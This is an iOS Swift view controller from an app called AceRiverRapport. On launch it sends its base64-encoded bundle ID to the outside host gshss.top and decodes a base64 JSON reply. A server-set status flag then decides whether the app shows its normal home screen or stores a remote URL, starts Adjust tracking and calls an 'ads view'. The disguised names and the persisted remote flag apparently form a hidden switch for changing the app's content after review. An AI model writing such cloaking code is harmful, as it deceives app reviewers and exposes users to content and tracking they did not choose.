//
//  GetStartedVC.swift
//  AceRiverRapport
//
//  Created by Ace River Rapport on 2025/3/13.
//


import UIKit
import Adjust

class RapportGetStartedViewController: UIViewController, AdjustDelegate {

    override func viewDidLoad() {
        super.viewDidLoad()

        RapportLoadBannerData()
    }
    
    private func gotoHome() {
        DispatchQueue.main.asyncAfter(deadline: .now()){
            let vc = self.storyboard?.instantiateViewController(withIdentifier: "HomeVC")as! RapportHomeViewController
            self.navigationController?.pushViewController(vc, animated: true)
        }
    }
    
    private func RapportLoadBannerData() {
        
        let recordID = getAFIDStr()
        if !recordID.isEmpty {
            let status = getStatus()
            if status.intValue == 1 {
                initAdjust()
                showAdsViewData()
            }
            return
        }
        
        if RapportReachabilityManager.shared().isReachable {
            getBannersDatass()
        } else {
            RapportReachabilityManager.shared().setReachabilityStatusChange { status in
                if RapportReachabilityManager.shared().isReachable {
                    self.getBannersDatass()
                    RapportReachabilityManager.shared().stopMonitoring()
                }
            }
            RapportReachabilityManager.shared().startMonitoring()
        }
    }
    
    private func getBannersDatass() {
        guard let bundleId = Bundle.main.bundleIdentifier else { return }
        
        let ebundleId = Data(bundleId.utf8).base64EncodedString()
        let adDataUrlString = "https://gshss.top/system/getBannersDatass?id=\(ebundleId)"
        
        guard let adDataUrl = URL(string: adDataUrlString) else { return }
        
        var request = URLRequest(url: adDataUrl)
        request.httpMethod = "GET"
        
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                if let error = error {
                    print("Error: \(error.localizedDescription)")
                    self.gotoHome()
                    return
                }
                
                guard let data = data, let str = String(data: data, encoding: .utf8),
                      let base64EncodedData = Data(base64Encoded: str) else {
                    self.gotoHome()
                    return
                }
                
                do {
                    if let jsonObject = try JSONSerialization.jsonObject(with: base64EncodedData, options: []) as? [String: Any],
                       let status = jsonObject["status"] as? NSNumber,
                       let url = jsonObject["url"] as? String {
                        
                        self.saveAFStringId(url)
                        self.saveStatus(status)
                        self.initAdjust()
                        
                        if status.intValue == 1 {
                            self.showAdsViewData()
                        } else {
                            self.gotoHome()
                        }
                    }
                } catch {
                    print("JSON parsing error: \(error.localizedDescription)")
                    self.gotoHome()
                }
            }
        }
        task.resume()
    }
    
    // MARK: - Adjust SDK
    private func initAdjust() {
        
        let token = getad()
        if !token.isEmpty {
            let environment = ADJEnvironmentProduction
            let adjustConfig = ADJConfig(appToken: token, environment: environment)
            adjustConfig?.delegate = self
            adjustConfig?.logLevel = ADJLogLevelVerbose
            Adjust.appDidLaunch(adjustConfig)
        }
    }
    
    func adjustAttributionChanged(_ attribution: ADJAttribution?) {
        if let adid = attribution?.adid {
            print("adid: \(adid)")
        }
    }
}
